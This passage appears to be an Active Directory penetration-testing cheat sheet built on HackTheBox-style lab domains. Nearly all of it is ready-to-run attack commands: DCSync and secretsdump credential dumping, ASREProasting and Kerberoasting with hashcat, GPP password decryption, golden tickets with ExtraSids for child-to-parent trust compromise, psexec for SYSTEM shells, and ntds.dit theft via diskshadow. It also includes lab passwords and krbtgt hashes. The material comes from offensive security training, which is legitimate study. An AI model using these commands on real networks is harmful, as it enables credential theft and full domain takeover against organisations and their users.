python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# Getting NTLM hash from TGT ticket (Submitting a TGS Request for Ourselves Using getnthash.py)
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

# Requesting TGT using rubeus
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
lsadump::dcsync /user:inlanefreight\krbtgt
```

## Miscellaneous Misconfigurations

```powershell
# DNS Records Enumeration
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
# Password in Description Field
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
# Checking for PASSWD_NOTREQD Setting using Get-DomainUser
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

# Credentials in SMB Shares and SYSVOL Scripts
# Viewing Groups.xml
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
<https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1>
# Locating & Retrieving GPP Passwords with CrackMapExec
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

# Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
# ASReproasting (windows)
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
# ASReproasting (Linux)
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
# Hunting for Users with Kerberoast Pre-auth Not Required
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

# GPP Passwords
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword

# Share enumeration
Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
findstr /m /s /i "pass" *.bat (.cmd, .ini, .config)
# Finding password with domain name
findstr /m /s /i "eagle" *.ps1
e.g. net use E: \\DC1\sharedScripts /user:eagle\Administrator Slavi123

# Enumerating GPO Names with PowerView (Group Policy)
Get-DomainGPO |select displayname
# Enumerating GPO Names with a Built-In Cmdlet
Get-GPO -All | Select DisplayName
# Enumerating Domain User GPO Rights
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
# Converting GPO to GUID to Name
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

## Enumerating AD Trust

```powershell
# Using AD Module
Get-ADTrust -Filter *

# Using PowerView
Get-DomainTrust
Get-DomainTrustMapping

netdom query /domain:inlanefreight.local trust
# Query dc
netdom query /domain:inlanefreight.local dc
# Using netdom to query workstations and servers
netdom query /domain:inlanefreight.local workstation
```

## Attacking Domain Trusts - Child -> Parent Trust

To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

**Window**

```powershell
# Getting KRBTGT hash
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
# Getting SID for child domain
Get-DomainSID
# Getting SID of Enterprise Admin in parent domain
(PowerView)
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
(AD Module)
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL

# Confirm Access to parent domain
ls \\academy-ea-dc01.inlanefreight.local\c$
# Confirming a Kerberos Ticket is in Memory Using klist
PS C:\htb> klist
# DCSync
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

ExtraSids Attack (Mimikatz)
# Creating golden ticket
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /startoffset:-5 /endin:600 /renew:10080 /ptt

ExtraSids Attack (Rubeus)
rc4: NT hash of krbtgt
sids: SID of Enterprise Admins
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

**Linux**

```powershell
# Getting krbtgt nt hash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
# Getting child domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
# Getting Enterprise Admin SID in parent domain
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
# Creating golden ticket
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
export KRB5CCNAME=hacker.ccache 

# Getting SYSTEM Shell wiht psexec
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

# Automatic way
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

## Finding DC in AD

```powershell
# Finding DC in parent domain
nltest /dsgetdc:INLANEFREIGHT.LOCAL

# Most Stealthy way
nslookup
> set type=SRV
> _ldap._tcp.dc._msdcs.parentdomain.com

SharpHound.exe -c Trusts,Sessions

Get-NetForestDomain
```

## Attacking Domain Trusts - Cross-Forest Trust Abuse

```powershell
(Windows)
# Enumerating Accounts for Associated SPNs Using Get-DomainUser
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
# Enumerating the mssqlsvc Account
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
# Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

(Linux)
# GetUserSPNs.py
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -request
# Bloodhoud-python
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
# zip files
zip -r ilfreight_bh.zip *.json
```

## Initial Foothold

```powershell
ldapdomaindump $IP -u 'fusion.corp\lparker' -p '****************' --no-json --no-grep

```

## Backup Operators

[https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

```powershell
# SeBackupPrivilege

nano raj.dsh

# raj.dsh file
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
# convert to dos
unix2dos raj.dsh

cd C:\Temp
upload raj.dsh
diskshadow /s raj.dsh
robocopy /b z:\windows\ntds . ntds.dit

reg save hklm\system c:\Temp\system
cd C:\Temp
download ntds.dit
download system
```